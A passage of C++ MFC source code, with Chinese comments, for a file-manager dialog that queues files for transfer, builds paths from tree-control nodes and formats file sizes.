		WIN32_FIND_DATAW FileData;
		HANDLE hFile = FindFirstFileW(strDesFilePath, &FileData);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			::MessageBox(this->m_hWnd, _T("无法传送该文件"), _T("提示"), MB_OK | MB_ICONWARNING);
		}
		else
		{
			DWORDLONG dl = MAXDWORD;
			__int64 uSize = ((__int64)FileData.nFileSizeHigh * (dl + 1)) + (__int64)FileData.nFileSizeLow;
			CString strRealSize = GetRealSize(uSize);
			((CFileManager*)m_pWndMsg)->m_tabCtrl.SetCurFocus(1);
			((CFileManager*)m_pWndMsg)->GetFileTransPoint()->OnAddFileList(1, strDesFilePath, strCurFilePath, strRealSize, 0);
		}
	}
}

//根据树控件的句柄值得到当前文件的路径
CString CFileView::GetCurFilePath(IN HTREEITEM hCurrentItem)
{
	CString strFullPath = _T("");  //返回的路径
	CString strTempPath = _T("");

	/*****  重点部分---- 根据当前选中的节点得到当前目录路径   **********/    
	while (hCurrentItem != m_Root_tree)
	{
		strTempPath = m_treeFile.GetItemText(hCurrentItem);
		if (strTempPath.Right(1) != _T("\\"))
		{
			strTempPath += _T("\\");
		}
		strFullPath = strTempPath + strFullPath;
		hCurrentItem = m_treeFile.GetParentItem(hCurrentItem);
	}
	return strFullPath;
}

//根据文件的路径得到在树控件中句柄
HTREEITEM CFileView::GetCurhItemByPath(IN CString strFolderName)
{
	HTREEITEM hChild = m_treeFile.GetChildItem(m_hItem);  //得到子节点的句柄
	while (NULL != hChild)
	{
		if (m_treeFile.GetItemText(hChild) == strFolderName)
		{
			break;
		}
		else
		{
			hChild = m_treeFile.GetNextSiblingItem(hChild);  //继续遍历兄弟节点
		}
	}
    return hChild;
}

void CFileView::DelChildItem(IN HTREEITEM hItem)
{
	while (NULL != m_treeFile.GetChildItem(hItem))
	{
		m_treeFile.DeleteItem(m_treeFile.GetChildItem(hItem));  //遍历删除节点下的所有子目录
	}
}

static CString GetRealSize(__int64 nSize)
{
	CString strFileSize = _T("");
	double result;
	if ( nSize >= 1024 * 1024 * 1024)  //GB
	{
		result = nSize * 1.0 / (1024 * 1024 * 1024);
		strFileSize.Format(_T("%0.2f GB"), result);
	}
	else if (nSize >= 1024 * 1024)   //MB
	{
		result = nSize * 1.0 / (1024 * 1024);
		strFileSize.Format(_T("%0.2f MB"), result);
	}
	else if (nSize >= 1024)    //KB
	{
		result = nSize * 1.0 / 1024;
		strFileSize.Format(_T("%0.2f KB"), result);
	}
	else
	{
		strFileSize.Format(_T("%0.2llu Byte"), nSize);
	}
	return strFileSize;
}

void CFileView::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	DestroyWindow();
	delete this;
}

void CFileView::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	((CFileManager*)this->m_pWndMsg)->m_pFileView = NULL; 
	CDialog::PostNcDestroy();
}
